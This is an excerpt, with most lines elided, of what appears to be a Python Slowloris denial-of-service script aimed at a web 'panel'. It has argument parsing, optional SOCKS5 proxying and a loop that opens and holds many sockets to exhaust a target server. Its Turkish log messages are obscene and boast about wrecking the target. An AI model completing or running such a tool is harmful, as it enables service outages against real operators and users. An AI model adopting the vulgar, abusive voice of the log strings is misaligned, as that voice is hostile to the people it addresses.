...
parser = argparse.ArgumentParser(
    description="Pomerd Panel Sikici"
)
...
if args.useproxy:
    ...
    try:
        ...
        logging.info("Bağlanmak için SOCKS5 proxy'si kullanılıyor...")
    except ImportError:
...
def slowloris_iteration():
    ...
    logging.info("%s yeni yuva oluşturuluyor bekle puşt...", diff)
    for _ in range(diff):
        try:
            ...
            logging.debug("Yeni soket oluşturulamadı siktir git yenisini bulda gel: %s", e)
            break
...
def main():
    ...
    logging.info("%s yuva ile %s saldırısı yapılıyor ve panelin anası sikiliyor", ip, socket_count)

    logging.info("Sikimeye hazırlanıyorum")
    for _ in range(socket_count):
        try:
            logging.debug("%s Soketinden sikicem anasını şimdi", _)
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
    ...
    while True:
        try:
            ...
            logging.debug("Hata verdi amk çocu: %s", e)
        logging.debug("%d devredışı ve uyuyor aktif olsun sikicem", args.sleeptime)
